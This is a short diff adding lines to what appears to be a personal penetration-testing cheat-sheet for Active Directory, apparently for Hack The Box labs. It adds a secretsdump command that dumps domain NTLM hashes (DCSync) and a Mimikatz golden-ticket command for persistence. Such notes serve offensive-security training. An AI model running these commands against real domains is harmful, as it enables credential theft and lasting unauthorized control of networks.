@@ -443,4 +443,9 @@ Always run winPEAS:
                            getuserspn.py htb.local/sam:password  -request
 
 
-
+                           secretdump.py spooky.local/user:password@10.10.10.10  -just-dc-ntlm
+                           dc sync attack:
+                           
+                           
+                           persistence:
+                           kerberos::golden /domian:spooky.local /sid:xxxxxxxxxxxxxxxxxxx  /user:admin /krbtgt:nt-hash /ptt
